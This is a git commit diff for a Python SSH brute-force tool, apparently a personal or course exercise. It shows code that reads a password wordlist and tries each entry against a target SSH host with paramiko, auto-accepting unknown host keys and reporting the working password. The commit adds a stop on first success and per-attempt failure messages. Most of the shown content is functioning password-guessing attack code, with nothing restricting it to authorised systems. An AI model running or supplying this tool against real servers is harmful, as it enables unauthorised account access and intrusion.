d1d389290a628cfea12e6a5099c1bbb2e2a2227b
rcaoagdan <rcaoagdan@icloud.com>
2021-08-18 16:53:23 -0700

    update

--- Brute_Force_Attack/bruteForce.py
+++ Brute_Force_Attack/bruteForce.py
@@ -2,14 +2,14 @@
 
 # Script: Brute Force Tool
 # Author: Ray Caoagdan
-# Date of Last Revision: 08/16/2021
+# Date of Last Revision: 08/18/2021
 
 ##############################################################################
 # Import Library
 ##############################################################################
 import time
 import itertools
-import sys, os, socket
+import socket
 import  paramiko 
 
 ##############################################################################
@@ -37,13 +37,13 @@ def runCheckPass():
     wordList.close()
     print(" ")
 
-def sshConnect(ssh_host,ssh_user,ssh_pwd):
+def sshConnect(ssh_host,ssh_user,ssh_pwd,connectStat = 0):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    connectStat = 0
+    
 
     try:
-        ssh.connect(ssh_host, username=ssh_user, password=ssh_pwd, connectStat=0)
+        ssh.connect(ssh_host, username=ssh_user, password=ssh_pwd)
 
     except paramiko.AuthenticationException:
         connectStat = 1 # Failed Authentication
@@ -60,19 +60,19 @@ def bruteForce():
     with open(filePath) as wordList:
         for passWrd in wordList:
             ssh_pwd = passWrd.strip('\n')
-            print("Testing: " + str(ssh_pwd))
             connection = sshConnect(ssh_host,ssh_user,ssh_pwd)
 
             if connection == 0:
                 print ('Succesful login to: ' + str(ssh_host) + ' username: ' + str(ssh_user) + ' password: ' + str(ssh_pwd))
+                break
             elif connection == 1:
-                print ('No succesful attempts. Password not found')
+                print ('Unsucessful login with password: ' + str(ssh_pwd) )
             elif connection == 2:
                 print("Connection could not be establish to: " + str(ssh_host))
             else:
                 print ("UNKOWN ERROR")
         
-
+        
   
     print(" ")
 
